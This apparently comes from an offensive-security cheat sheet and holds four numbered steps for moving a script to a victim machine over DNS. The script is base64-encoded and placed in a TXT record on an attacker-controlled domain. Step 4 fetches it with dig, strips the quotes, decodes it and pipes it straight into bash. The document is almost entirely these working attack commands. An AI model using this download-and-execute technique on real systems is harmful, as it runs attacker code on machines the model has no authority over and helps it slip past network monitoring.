## Example:


### 1) Victim2: cat /tmp/script.sh | base64

### 2) Add the encoded script as a TXT DNS record to the domain we control

### 3) Victim2: dig +short -t TXT script.example.com

### 4) Victim2: dig +short -t TXT script.example.com | tr -d "\"" | base64 -d | bash
